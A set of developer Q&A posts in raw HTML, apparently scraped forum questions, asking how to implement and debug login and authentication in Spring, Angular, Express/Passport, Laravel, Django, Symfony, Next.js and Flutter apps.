Is SSO or OAuth the way to go? I think this is generally used to sign in with Google or Facebook, etc, but in this case, we don't want to depend on Google/Facebook accounts, the users use business emails.</p>
<p>I'm thinking of having the third-party app use a secret key to encrypt an API Token, when the user clicks the button on their app, they will send a redirect to my app with the user data and the encrypted token. I will use the secret key to validate the Token and give the user access.</p>
<p>I want guidance on what approach is more convenient, the responsibilities of each app, and how to implement it.</p>
"
"<p>I have created Security For Each UserDetails. And Added Login Page url for each as below.Now I want all the login page to be public and other endpoints that doesnot start with the user or business-segment to be public too.For more references <a href=""https://www.baeldung.com/spring-security-multiple-entry-points"" rel=""nofollow noreferrer"">I am following this documentation</a>.</p>
<pre><code>@Configuration
@Order(3)
@EnableWebSecurity
public class BusinessSegmentSecurity {
    @Bean
    public SecurityFilterChain securityFilterChainForBusinessSegment(HttpSecurity httpSecurity) throws Exception {
        httpSecurity.cors(AbstractHttpConfigurer::disable);
        httpSecurity.securityMatcher(AntPathRequestMatcher.antMatcher(&quot;/business-segment/**&quot;));
        httpSecurity.authorizeHttpRequests(auth -&gt; auth
                .requestMatchers(&quot;/business-segment/auth/**&quot;).permitAll()
                .requestMatchers(&quot;/business-segment/**&quot;).authenticated());
        httpSecurity.formLogin(form -&gt; form
                .loginPage(&quot;/business-segment/auth/login&quot;)
                .loginProcessingUrl(&quot;/business-segment/auth/login&quot;)
                .permitAll()
                .defaultSuccessUrl(&quot;/business-segment&quot;))
                .logout(httpSecurityLogoutConfigurer -&gt; httpSecurityLogoutConfigurer.logoutSuccessUrl(&quot;/business-segment/auth/login&quot;));
        httpSecurity.userDetailsService(new BusinessSegmentService());
        return httpSecurity.build();
    }
}

@Configuration
@Order(1)
@EnableWebSecurity
public class AppSecurity {
    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }

    @Bean
    public SecurityFilterChain securityFilterChainForGuest(HttpSecurity httpSecurity) throws Exception {
        httpSecurity.securityMatcher(AntPathRequestMatcher.antMatcher(&quot;/**&quot;));
        httpSecurity.authorizeHttpRequests(authorizationManagerRequestMatcherRegistry -&gt; authorizationManagerRequestMatcherRegistry.anyRequest().permitAll());
        return httpSecurity.build();
    }
}

@Configuration
@Order(2)
@EnableWebSecurity
public class UserSecurity {
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity httpSecurity) throws Exception {
        httpSecurity.cors(AbstractHttpConfigurer::disable);
        httpSecurity.csrf(AbstractHttpConfigurer::disable);
        httpSecurity.securityMatcher(AntPathRequestMatcher.antMatcher(&quot;/user/**&quot;));
        httpSecurity.authorizeHttpRequests(auth -&gt; auth
                .requestMatchers(&quot;/user/auth/**&quot;).permitAll()
                .requestMatchers(&quot;/user/**&quot;).authenticated());
        httpSecurity.formLogin(form -&gt; form
                .loginPage(&quot;/user/auth/login&quot;)
                .loginProcessingUrl(&quot;/user/auth/login&quot;)
                .permitAll()
                .defaultSuccessUrl(&quot;/user&quot;))
                .logout(httpSecurityLogoutConfigurer -&gt; httpSecurityLogoutConfigurer.logoutSuccessUrl(&quot;/user/auth/login&quot;));
        httpSecurity.userDetailsService(new CustomUserDetailService());
        return httpSecurity.build();
    }
}
</code></pre>
<pre class=""lang-java prettyprint-override""><code></code></pre>
"
"<p>After successful login, user navigate to home page. but when page is refreshed, login page flashes for a second. Most probably the reason is, same page is rendering on server-side 1st, then on Client-side. I've set it as, if user authentication false, redirect to login page, login then redirect to respected page on authGuard.</p>
<h3>authGuard.ts</h3>
<pre><code>export const AuthGuard: CanActivateFn | CanActivateChildFn = (route, state) =&gt; {
  const router: Router = inject(Router);
  return inject(AuthService).checkAuthentication()
  .pipe(
    switchMap((isAuthenticated)=&gt;{
      if (!isAuthenticated) {
        return router.createUrlTree(['auth/sign-in'], {queryParams: {param: state.url}})
      }
      return of(true);
    })
  );
}
</code></pre>
<p>While refreshing page, and when page is rendering on server side it gets <strong>Authentication false</strong> that's why it renders login page then send it to clint-side. But on client side it get's <strong>Authentication true</strong> then it's display home page(or other page). however between this time route doesn't change. here is the screen shots where authentication false on server &amp; true on client side at the same time.
<a href=""https://i.stack.imgur.com/8uRwA.png"" rel=""nofollow noreferrer"">SSR and CSR Compare Screenshots</a></p>
<p>However, if i turn off SSR, login page does not flash at all. So, is there any way to solve this flashing issue without turned of SSR mode?</p>
<h3>app.route.ts</h3>
<pre><code>export const routes : Routes = [
  {
    path: '',
    component: LayoutComponent,
    canActivate: [AuthGuard],
    canActivateChild: [AuthGuard],
    children: [
      { path: 'home', component: DashboardComponent },
      { path: 'settings', loadChildren: () =&gt; import('./modules/settings/settings.routes') },
      { path: 'users', loadChildren: () =&gt; import('./modules/users/users.routes')},
    ]
  },
  {
    path: 'auth',
    loadChildren: ()=&gt; import('./login/login.routes')
  },
  { path: '', pathMatch: 'full', redirectTo: 'home' },
  { path: '**', pathMatch: 'full', redirectTo: 'home' },
];
</code></pre>
<h3>auth.service.ts</h3>
<pre><code>@Injectable({ providedIn: 'root' })
export class AuthService {
 private _storeService = inject(StoreService);

 signIn(credentials: { username: string; password: string }): Observable&lt;any&gt; {

        return this._httpClient.post(AUTH_API + 'User/login', credentials).pipe(
            switchMap((response: any) =&gt; {
                this._storeService.saveAccessToken(response.token); // save token on sessionStorage
                this._storeService.saveActiveUser(response.user);
                return of(response);
            }),
        );
    }

 get accessToken(): string {
        return this._storeService.getAccessToken() ?? '';
    }

  checkAuthentication : Observable&lt;boolean&gt; (){

    if ( !this.accessToken ||  AuthUtils.isTokenExpired(this.accessToken))
        {
          return of(false);
        } else { return of(true) }
   }

}

</code></pre>
<p>Please let me know if i need to share more code ... thanks.</p>
<p>I've tried going through angular documents / stackoverflow / googleing relating this issue. but couldn't find suitable solution for this problem.  also,i could not find that much example with functional approach.</p>
"
"<p>I'm a beginner of coding.
I'm trying to build an authentication system with passport-local.
When I entered the correct email and password, the passport.authenticate succeed, to make sure that I use <code>console.log(req.user)</code> to make sure that it exist and it sure did.
However, after the successRedirect, the req.user isn't existed in the req.
Also, the req.isAuthenticated() return false.
Have anyone face the same problem before?
I have stuck in this for days.</p>
<p>Below is my Server-side code</p>
<pre><code>import express from &quot;express&quot;;
const app = express();
import mysql from &quot;mysql2&quot;;
import cors from &quot;cors&quot;;
import bcrypt from &quot;bcrypt&quot;;
import session from &quot;express-session&quot;;
import passport from &quot;passport&quot;;
import { Strategy } from &quot;passport-local&quot;;
import flash from &quot;connect-flash&quot;;
app.use(cors({ credentials: true, origin: true }));
app.use(express.json());

app.use(
  session({
    secret: &quot;MEMBERSECRETINFO&quot;,
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false, maxAge: 1000 * 60 * 60, sameSite: &quot;none&quot; },
  })
);
app.use(flash());
app.use(passport.initialize());
app.use(passport.session());

passport.serializeUser((user, cb) =&gt; {
  console.log(&quot;serializeUser:&quot;, user.id);
  cb(null, user.id);
});

passport.deserializeUser((id, cb) =&gt; {
  memberDb.query(&quot;SELECT * FROM members WHERE id = ?&quot;, [id], (err, result) =&gt; {
    if (err) {
      return cb(err);
    }
    const user = result[0];
    console.log(user);
    if (user) {
      console.log(&quot;deserializeUser: &quot;, user);
      cb(null, user);
    }
  });
});

app.get(&quot;/membership&quot;, (req, res) =&gt; {
  if (req.isAuthenticated()) {
    res.status(200).json({ message: &quot;You have logged in!&quot; });
  } else {
    res.status(200).json({ message: &quot;You haven't logged in yet!&quot; });
  }

app.post(
  &quot;/login&quot;,
  passport.authenticate(&quot;local&quot;, {
    failureRedirect: &quot;/login&quot;,
    failureMessage: true,
    keepSessionInfo: true,
    failureFlash: true,
  }),
  function (req, res) {
    if (req.isAuthenticated) {
      // console.log(req.user);
      res.cookie(&quot;test cookie&quot;, req.session.cookie, {
        maxAge: 60000,
        httpOnly: true,
      });
      req.session.save((err) =&gt; {
        if (err) {
          res.send(err);
        }
        res.redirect(&quot;/membership&quot;);
      });
    } else {
      res.send({ message });
    }
  }
);

passport.use(
  new Strategy(
    {
      usernameField: &quot;email&quot;,
      passwordField: &quot;password&quot;,
      passReqToCallback: true,
    },
    function verify(req, email, password, cb) {
      try {
        memberDb.query(
          &quot;SELECT * FROM members WHERE email = ?&quot;,
          [email],
          (err, result) =&gt; {
            if (err) {
              return cb(err);
            }
            const user = result[0];
            if (!user) {
              return cb(null, false);
            }
            const storedHashedPassword = user.password;
            bcrypt.compare(password, storedHashedPassword, (err, result) =&gt; {
              if (err) {
                return cb(err);
              } else {
                if (result) {
                  return cb(null, user);
                } else {
                  req.session.save((err) =&gt; {
                    if (err) {
                      return cb(err);
                    }
                    return cb(null, false, {
                      message: &quot;Invalid username or password&quot;,
                    });
                  });
                }
              }
            });
          }
        );
      } catch (err) {
        return cb(err);
      }
    }
  )
);
</code></pre>
<p>Below is my Client-side code</p>
<pre><code>Axios.defaults.withCredentials = true;
const login = (e) =&gt; {
    e.preventDefault();
    Axios.post(&quot;http://127.0.0.1:5174/login&quot;, {
      email: signinInfo.email,
      password: signinInfo.password,
    })
      .then((response) =&gt; {
        if (response.data.user) {
          setLoginStatus(response.data.user);
          // navigate(&quot;/membership&quot;);
        } else if (response.data.messages != &quot;Missing credentials&quot;) {
          setLoginStatus(response.data.messages);
        } else {
          setLoginStatus(&quot;You haven't filled your Email/Password&quot;);
        }
      })
      .catch((err) =&gt; {
        console.log(&quot;Error: &quot; + err);
      });
  };
</code></pre>
<p>Thank you in advanve.
Wish you have a good day without facing any bug.</p>
"
"<p>Edited based on &quot;Guillaume Blaquiere&quot; answer:</p>
<p>I have a GCP(Google Cloud Platform) HTTPS function, I need to research the difference between &quot;Cloud Functions&quot;, &quot;Cloud Run&quot; and &quot;App Engine&quot;.
<a href=""https://medium.com/google-cloud/secure-cloud-run-cloud-functions-and-app-engine-with-api-key-73c57bededd1"" rel=""nofollow noreferrer"">And I'll look into this tonight, thank you Guillaume Blaquiere</a></p>
<p>I have a RaspberryPi computer as a client which calls the HTTPS function.</p>
<p>I want to use an API-Key or Private-Key to authenticate instead of a bearer token or something similar. That way it can be set up once and used forever.
I accept the security risk because in my case if something happens, I will just set it up again. (with a new key)</p>
<p>I need a &quot;prebaked&quot; cURL command like this: (which dose work, for a short period of time)</p>
<pre><code>curl -H &quot;Authorization: Bearer eyJhbGc-MY-BEARER-TOKEN-3Uw3kURBQ&quot; https://&lt;region&gt;-&lt;project-id&gt;.cloudfunctions.net/myfunction
</code></pre>
<p>This is how the command is normally called: (which I cant use)</p>
<pre><code>curl -H &quot;Authorization: bearer $(gcloud auth print-identity-token)&quot; https://&lt;region&gt;-&lt;project-id&gt;.cloudfunctions.net/myfunction
</code></pre>
<p>I cant use any variables and I cant set anything up on the RaspberryPi,
I need one cURL command.
Is this possible?</p>
"
"<p>I am working on a NodeJS Notification Bot with Restify Server that has an exposed endpoint for receiving POST messages from an external service. How can I add authentication to this endpoint? I have seen some examples of authentication, but none of them seem to clarify which keys to use and how to use them. Any help or guidance would be appreciated.</p>
<p>This bot was created from the default notification bot template in Teams App Toolkit.</p>
<p><a href=""https://i.stack.imgur.com/JmY1N.png"" rel=""nofollow noreferrer"">doubts</a></p>
<p>I found some secrets in direct line configuration page but I dont know how to automatically import them into the bot so I can check for it in the header, if that is even how it must be done. I also couldnt find the documentation related to App Service Extension Keys, which are available on the same page.</p>
"
"<p>I'm stuck with this error in laravel, What I want is to verify the email address once they receive the email notification. But everytime I click the link on the email notification it has an error:  &quot; Call to undefined method App\Models\Businessuser::markEmailAsVerified()</p>
<p>Can somebody Help me? I've installed auth package, but Im new in using this, and I havent tried this on my codes. Just would like to know if theres something to do with the auth.</p>
<p><a href=""https://i.stack.imgur.com/ydUJ4.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/ydUJ4.png"" alt=""error message"" /></a>
this is for the verify controller</p>
<pre><code>&lt;?php

namespace App\Http\Controllers;
use App\Models\Businessuser;
use Illuminate\Http\Request;
use Illuminate\Auth\Notifications\VerifyEmail;
use Illuminate\Foundation\Auth;

class VerifyemailController extends Controller
{
    public function verify($businessuser_id, Request $request)
    {
        if(!$request-&gt;hasValidSignature()){
            return response()-&gt;json([&quot;msg&quot;=&gt;'Invalid/Expired url provided'], 401);
        }

        $bususer = Businessuser::find($request-&gt;route('id'));

         if($bususer-&gt;markEmailAsVerified()){
            return response()-&gt;json([&quot;status&quot;=&gt;200, &quot;msg&quot;=&gt;'Verified']);
        }
     
    }
}

</code></pre>
<p>Register Controller</p>
<pre><code>&lt;?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Businessuser;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;
use App\Mail\Email;
use App\Mail\EmailNotification;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Validator;


class RegisterController extends Controller
{
    public function register(Request $request){
       //return view('register');


      $validateEmail = request()-&gt;validate([
                'email' =&gt; 'required|email|unique:businessusers',
        ]);


      $bususer = new Businessuser;
      $bususer-&gt;busname = $request-&gt;input('busname');
      $bususer-&gt;province = $request-&gt;input('province');
      $bususer-&gt;city = $request-&gt;input('city');
      $bususer-&gt;barangay = $request-&gt;input('barangay');
      $bususer-&gt;street = $request-&gt;input('street');

    
      $bususer-&gt;tinum = $request-&gt;input('tinum');
      $bususer-&gt;firstname = $request-&gt;input('firstname');
      $bususer-&gt;lastname = $request-&gt;input('lastname');
      $bususer-&gt;middleinitial = $request-&gt;input('middleinitial');
      
      $bususer-&gt;mobile = $request-&gt;input('mobile');
      $bususer-&gt;email = $request-&gt;input('email');   

      $bususer-&gt;save();

      Mail::to($bususer-&gt;email)-&gt;send(new EmailNotification($bususer));

       return $bususer;

    }

    public function testconnection(){
        
    }
}
</code></pre>
<p>Business User Model</p>
<pre><code>&lt;?php

namespace App\Models;

use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Eloquent\Concerns\HasTimestamps;
use Carbon\Carbon;
use Illuminate\Foundation\Auth\User as Authenticatable;
use Illuminate\Notifications\Notifiable;
use Illuminate\Contracts\Auth\MustVerifyEmail;


class Businessuser extends Model
{
    use HasFactory;

     /**
     * The attributes that are mass assignable.
     *
     * @var array&lt;int, string&gt;
     */

     protected $table = 'businessusers';
     protected $primaryKey = 'id';
     protected $fillable = [
        'busname',
        'province',
        'city',
        'barangay',
        'street',
        'tinum',
        'firstname',
        'lastname',
        'middleinitial',
        'owner',
        'mobile',
        'email',
     ];

     /**
     * The attributes that should be hidden for serialization.
     *
     * @var array&lt;int, string&gt;
     */

   // const CREATED_AT = 'created_at';
    /* const UPDATED_AT = null;*/

  

    protected $hidden = [
        'password',
        'remember_token',
    ];

     

     protected $casts = [
        'email_verified_at' =&gt; 'datetime',
    ];

 
}

</code></pre>
<p>api/route</p>
<pre><code>&lt;?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\RegisterController;
use App\Http\Controllers\VerifyemailController;


Route::middleware('auth:sanctum')-&gt;get('/user', function (Request $request) {
    return $request-&gt;user();
});

Route::post('register', [RegisterController::class, 'register']);
Route::get('testconnection', [RegisterController::class, 'testconnection']);
Route::get('email/verify/{id}', [VerifyemailController::class, 'verify'])-&gt;name('verification.verify');

</code></pre>
<p>Email Html file</p>
<pre><code>&lt;h1&gt;Congratulations! &lt;/h1&gt;
&lt;h1&gt;Were Welcoming you from registering in Love Laguna&lt;/h1&gt;
&lt;h1&gt;User {{$bususer-&gt;id}}&lt;/h1&gt;
&lt;h1&gt;Business {{$bususer-&gt;busname}} &lt;/h1&gt;
&lt;h1&gt;Click on the link to verify the email address&lt;a href=&quot;{{URL::temporarySignedRoute('verification.verify', now()-&gt;addMinutes(30), ['id' =&gt; $bususer-&gt;id]) }}&quot;&gt; Verify Email&lt;/a&gt;&lt;/h1&gt;
</code></pre>
<p>Routes</p>
<pre><code>&lt;?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\RegisterController;
use Illuminate\Support\Facades\Auth;

Route::get('/', function () {
    return view('welcome');
});


Route::get('/register', [RegisterController::class, 'register'])-&gt;name('register');
</code></pre>
"
"<p>I am a .NET developer working on a personal project for what hopefully will be a web-based SaaS application someday. This application will run on Microsoft Azure.</p>
<p>Although I have 20+ years of experience with .NET, this is my first try at working on a SaaS application and I have minimal experience with Azure. With Azure, I only have a free account for personal needs with basic services.</p>
<p>There are some technical decisions that I have to make, one of them is what identity and access management solution to use. My application at launch will have a limited number of users but potentially can grow to several thousands, even hundreds of thousands, I have been looking into some options. One of them is Microsoft Entra ID (formerly known as Azure Active Directory).</p>
<p>My question is: does it make sense to use a solution like Microsoft Entra, considering that I am a solo developer without a company infrastructure? MS Entra is always described as an authentication and authorization service for a company with an infrastructure, thus my doubts is that Entra may be overkill for my needs, or just not suitable. If not suitable, can anyone suggest a better option?</p>
"
"<p>Is it possible to authenticate a user and receive an access token from an OIDC identity provider without leaving the application and using a browser?</p>
"
"<p>I would like to ask if there is any security misconfiguration in Amazon Cognito to store the UserPoolId and the ClientId hardcoded in the source code of a web page. Let's say that an unauthorized user can find these IDs in the source code and create a user. Is this a bad practice?</p>
<p>I am interesting to know if this is a security issue. I have tried to research this problem, but I did not find any exact responses.</p>
"
"<p>I am making a simple login page using Node.js for back-end stuff and passport for authentication. To me all my code looks good and it looks like it should work. I even put it into chatGPT and it couldn't find any problems, either. No matter the input for the login page, even if it is correct, I get redirected to the failureRedirect page. I know the passwords and emails are correct, even though they are hashed and salted, because I make them extremely simple 3 character passwords for testing purposes. I even seen the hashed password in my DB.</p>
<p>My approach to the problem is taking the submitted input from the user and salting it then hashing it, and storing it to the DB. Then I used the local passport strategy to handle the authentication process by comparing the form input to the user input and if it matches the user will be redirected to a certain page and if not they will be redirected to another page, just for testing purposes. I will include relevant code below to give you a better idea of how I approached this problem.</p>
<pre><code>//my User model, exported correctly
const UserSchema = new Schema({
    firstName: {type: String, required: true},
    lastName: {type: String, required: true},
    email: {type: String, required: true},
    password: {type: String, required: true},
    posts: {type: Schema.Types.ObjectId, ref: &quot;Post&quot;}
})
</code></pre>
<pre><code>// password hashing code &amp; user creation
asyncHandler(async (req, res, next) =&gt; {
    try {
        // Hash the password
        const hashedPassword = await bcrypt.hash(req.body.password, 10);

        // Check if user with the provided email already exists
        const existingUser = await User.findOne({ email: req.body.email }).exec();

        if (existingUser) {
            return res.status(400).send('Email already exists. Please use a different one.');
        }

        // Create new user
        const user = new User({
            firstName: req.body.firstName,
            lastName: req.body.lastName,
            email: req.body.email,
            password: hashedPassword // Use the hashed password
        });

        await user.save();

        // Redirect after successful registration
        res.redirect(&quot;/&quot;);
    } catch (err) {
        next(err);
    }
});
</code></pre>
<pre><code>// snippet of my authentication 
function configurePassport(passport) {
    passport.use(new LocalStrategy( async (email, password, done) =&gt; {
      try {
        const user = await User.findOne({ email: email })
        if (!user) {
          //usernames do not match!
          return done(null, false, { message: &quot;Incorrect username&quot; })
        };
        const match = await bcrypt.compare(password, user.password)
        if (!match) {
            // passwords do not match!
            return done(null, false, { message: &quot;Incorrect password&quot; })
          }
        return done(null, user);
      } catch(err) {
        return done(err);
      };
    }));
}
</code></pre>
<pre><code>  h1= title
  if user 
    h1 Welcome back #{user.firstName}
  else  
    form(action=&quot;/&quot;, method=&quot;post&quot;)  
      input(type=&quot;email&quot;, name=&quot;email&quot;, placeholder=&quot;email&quot;)
      input(type=&quot;password&quot;, name=&quot;password&quot;, placeholder=&quot;password&quot;)
      button(type=&quot;submit&quot;) Log In
    a(href=&quot;/register&quot;) Register Now
</code></pre>
<pre><code>passport.authenticate(&quot;local&quot;, {
    successRedirect: &quot;/&quot;,
    failureRedirect: &quot;/register&quot;
});
</code></pre>
<p>So I have included my code for my Schema initialization, user creation and password hashing, the user authentication, and even my login form using pug with the passport.authenticate code. I have tried almost everything and I am not sure where I am going wrong. This is such a simple app that I feel like it has to be something simple. Also the configurePassword function is imported and called in my main app as <code>configurePassword(passport)</code>.</p>
"
"<p>I'm learning Django class-based views and can not find a mistake. I'm writing todo application using classes. After successful authentication, I navigate to the task creation page, where the user is displayed correctly. I can save tasks, and I see a list of all tasks. Then, I lod out of the application and login as ahotner user. However, I still see the same tasks that I created for the first user. Where did I go wrong? Why aren't the tasks separated based on the user?</p>
<p>Thank you!</p>
<p>models.py:</p>
<pre><code>from django.db import models
from django.contrib.auth.models import User




class Task(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    title = models.CharField(max_length=200)
    description = models.TextField(null=True, blank=True)
    complete = models.BooleanField(default=False)
    create = models.DateTimeField(auto_now_add=True)


    def __str__(self):
        return self.title

    class Meta:
        ordering = ['complete']
</code></pre>
<p>urls.py:</p>
<pre><code>from django.urls import path
from .views import TaskDetail, TaskList, TaskCreate, TaskUpdate, DeleteTask, CustomLoginView
from django.contrib.auth.views import LogoutView

urlpatterns = [
    path('login/', CustomLoginView.as_view(), name='login'),
    path('logout/', LogoutView.as_view(next_page='login'), name='logout'),
    path('', TaskList.as_view(), name='tasks'),
    path('task/&lt;int:pk&gt;/', TaskDetail.as_view(), name='task'),
    path('create-task/', TaskCreate.as_view(), name='create_task'),
    path('task-update/&lt;int:pk&gt;/', TaskUpdate.as_view(), name='update_task'),
    path('task-delete/&lt;int:pk&gt;/', DeleteTask.as_view(), name='delete_task'),
</code></pre>
<p>views.py:</p>
<pre><code>from django.urls import reverse_lazy
from django.views.generic import ListView, DetailView, CreateView, UpdateView, DeleteView
from django.contrib.auth.views import LoginView
from .models import Task

from django.contrib.auth.mixins import LoginRequiredMixin


class CustomLoginView(LoginView):
    template_name = 'todo_app/login.html'
    fields = '__all__'
    redirect_authenticated_user = True

    def get_success_url(self):
        return reverse_lazy('tasks')


class TaskList(LoginRequiredMixin, ListView):       # django searching todo_app/task_list.html to connect
    model = Task  # class require model OR queryset
    context_object_name = 'tasks'

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        print(context)
        context['tasks'] = context['tasks'].filter(user=self.request.user)
        context['count'] = context['tasks'].filter(complete=False).count()
        print(context)
        return context


class TaskDetail(LoginRequiredMixin, DetailView):
    model = Task
    context_object_name = 'task'  # getting object through 'task'
    template_name = 'todo_app/task.html'  # changing default rout


class TaskCreate(LoginRequiredMixin, CreateView):
    model = Task
    fields = ['user', 'title', 'description']       # return all fields of model
    success_url = reverse_lazy('tasks')             # after successful creating object redirect to name='tasks'

    def form_valid(self, form):
        form.instance.user = self.request.user
        return super().form_valid(form)


class TaskUpdate(LoginRequiredMixin, UpdateView):
    model = Task
    fields = '__all__'
    success_url = reverse_lazy('tasks')


class DeleteTask(LoginRequiredMixin, DeleteView):
    model = Task
    context_object_name = 'task'
    success_url = reverse_lazy('tasks')
</code></pre>
<p>task_form.html:</p>
<pre><code>&lt;h3&gt;Task Form&lt;/h3&gt;
&lt;a href=&quot;{% url 'tasks' %}&quot;&gt;Go Back {{ request.user }}&lt;/a&gt;
&lt;form method=&quot;POST&quot; action=&quot;&quot;&gt;
    {% csrf_token %}
    {{ form.as_p }}
    &lt;input type=&quot;submit&quot; value=&quot;Create Task&quot;&gt;
&lt;/form&gt;
</code></pre>
<p>task_list.html:</p>
<pre><code>{% if request.user.is_authenticated %}
    &lt;p&gt;{{ request.user }}&lt;/p&gt;
    &lt;form method=&quot;post&quot; action=&quot;{% url 'logout' %}&quot;&gt;
    {% csrf_token %}
    &lt;button type=&quot;submit&quot;&gt;logout&lt;/button&gt;
    &lt;/form&gt;
    {% else %}
    &lt;a href=&quot;{% url 'login' %}&quot;&gt;Login&lt;/a&gt;
{% endif %}

&lt;hr&gt;
&lt;h1&gt;My To Do List&lt;/h1&gt;
&lt;a href=&quot;{% url 'create_task' %}&quot;&gt;Add Task&lt;/a&gt;

&lt;table&gt;
    &lt;tr&gt;
        &lt;th&gt;Item&lt;/th&gt;
        &lt;th&gt;&lt;/th&gt;
    &lt;/tr&gt;
    {% for task in object_list %}
    &lt;tr&gt;
        &lt;td&gt;{{ task.title }}&lt;/td&gt;
        &lt;td&gt;&lt;a href=&quot;{% url 'task' task.id %}&quot;&gt;View&lt;/a&gt;&lt;/td&gt;         &lt;!-- 'task' from urls --&gt;
        &lt;td&gt;&lt;a href=&quot;{% url 'update_task' task.id %}&quot;&gt;Edit&lt;/a&gt;&lt;/td&gt;
        &lt;td&gt;&lt;a href=&quot;{% url 'delete_task' task.id %}&quot;&gt;Delete&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    {% empty %}
    &lt;h3&gt;No items in list&lt;/h3&gt;
    {% endfor %}
&lt;/table&gt;
</code></pre>
<p>login.html:</p>
<pre><code>&lt;h1&gt;Login&lt;/h1&gt;

&lt;form method=&quot;POST&quot;&gt;
    {% csrf_token %}
    {{ form.as_p }}
    &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;
&lt;/form&gt;
</code></pre>
<p>I expect to save user data for each object separately.</p>
"
"<p>i'm building a Next.js app with laravel breeze api in the backend which has built in authentification functions.
<a href=""https://i.stack.imgur.com/lbyob.png"" rel=""nofollow noreferrer"">default login function in laravel breeze</a></p>
<p>when i try it on Postman it returns empty response, with 'set-cookie' in the response headers which sets the auth cookies automatically in Postman and allows me to make calls to secured routes without problems.
<a href=""https://i.stack.imgur.com/4sy4s.png"" rel=""nofollow noreferrer"">login response headers in Postman</a></p>
<p>But when i try calling that route in Next.js (using Axios) it returns the same thing but doesn't set the cookies automatically, so i needed a way to extract them from the response header and set them manually (maybe it's a bad idea 😅).
<a href=""https://i.stack.imgur.com/z3pTq.png"" rel=""nofollow noreferrer"">function that sets cookies (server side) in Next 14</a></p>
<p>when i use this server function in login button it works just fine. but when i try to await for a response (eg. login function response to get headers from it) it just doesn't set the cookie.</p>
<p>so if anyone knows a better way to deal with 'set-cookie' header in next.js or knows how to set cookies after awaiting for data to come pls help.</p>
"
"<p>i have two roles in my application one is admin and the other is the mother each role have a different interface i first tried to make the both roles sign in by the same route and same interface and the code works perfectly for both but now that i want to add another route and seperate the users login interfaces  i don't know how to do it any help ?</p>
<pre><code>
namespace App\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Component\Security\Http\Authentication\AuthenticationUtils;
use Symfony\Component\Security\Core\Security;
class AuthController extends AbstractController
{
    #[Route('/', name: 'admin_login')]
    public function loginAdmin(AuthenticationUtils $authenticationUtils,Security $security): Response
    {
        $user = $security-&gt;getUser();
        if ($user) {
            // Check the role of the user
            if (in_array('ROLE_MOTHER', $user-&gt;getRoles())) {
                // If the user is a mother, redirect to another route
                return $this-&gt;redirectToRoute('app_testTemplate');
            }
           else{
            return $this-&gt;redirectToRoute('get_users');
           }
        }
        // Get the login error if there is one
        $error = $authenticationUtils-&gt;getLastAuthenticationError();
        // Last username entered by the user
        $lastUsername = $authenticationUtils-&gt;getLastUsername();
        return $this-&gt;render('security/admin_login.html.twig', [
            'last_username' =&gt; $lastUsername,
            'error' =&gt; $error,
        ]);
    }
    #[Route('/logout', name: 'app_logout')]
    public function logout(): void
    {
        
    }
}
  ``` this is my controller for handling login and this is my security.yaml file ```                                
security:
    enable_authenticator_manager: true
    # https://symfony.com/doc/current/security.html#registering-the-user-hashing-passwords
    password_hashers:
        Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface: 'auto'
    # https://symfony.com/doc/current/security.html#loading-the-user-the-user-provider
    providers:
        # used to reload user from session &amp; other features (e.g. switch_user)
        app_user_provider:
            entity:
                class: App\Entity\User
                property: email
        # used to reload user from session &amp; other features (e.g. switch_user)
    firewalls:
        dev:
            pattern: ^/(_(profiler|wdt)|css|images|js)/
            security: false
        main:
            lazy: true
            provider: app_user_provider
            form_login:
                login_path: admin_login
                check_path : admin_login
                enable_csrf: true
            logout:
                path: app_logout
                # where to redirect after logout
                target: admin_login
                # where to redirect after logout
                # target: app_any_route
            remember_me:
                secret: '%kernel.secret%'
                lifetime: 604800
                path: /
                always_remember_me: true
                # where to redirect after logout
                # target: app_any_route

            # activate different ways to authenticate
            # https://symfony.com/doc/current/security.html#the-firewall

            # https://symfony.com/doc/current/security/impersonating_user.html
            # switch_user: true

    # Easy way to control access for large sections of your site
    # Note: Only the *first* access control that matches will be used
    access_control:
        #  - { path: ^/admin, roles: ROLE_ADMIN }
        #  - { path: ^/user, roles: ROLE_MOTHER}

when@test:
    security:
        password_hashers:
            # By default, password hashers are resource intensive and take time. This is
            # important to generate secure password hashes. In tests however, secure hashes
            # are not important, waste resources and increase test times. The following
            # reduces the work factor to the lowest possible values.
            Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface:
                algorithm: auto
                cost: 4 # Lowest possible value for bcrypt
                time_cost: 3 # Lowest possible value for argon
                memory_cost: 10 # Lowest possible value for argon
</code></pre>
"
"<p>I create database and user entity in my symfony project, I try it with postman (create user, get all users) and it work correctly
and I developed my Flutter interface to signup and signin.
My problem is how to relate my flutter to symfony</p>
<p>I tried this:</p>
<pre><code>Future&lt;void&gt; _signup(BuildContext context) async {
    final String url = 'https://127.0.0.1:8000/userCreate'; 
    final Map&lt;String, dynamic&gt; data = {
      'name': nameController.text,
      'email': emailController.text,
      'password': passwordController.text,
      'phoneNumber': phoneNumberController.text,
    };

    final response = await http.post(
      Uri.parse(url),
      body: jsonEncode(data),
      headers: {'Content-Type': 'application/json'},
    );

    final responseData = jsonDecode(response.body);
    if (responseData['status'] == true) {
      // Signup successful, navigate to login screen or perform other actions
    } else {
      // Signup failed, display error message to the user
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text(responseData['message'])),
      );
    }
  }
</code></pre>
<p>It works when I run it in windows or with navigator
but with my phone or emulator it give me an error.</p>
"
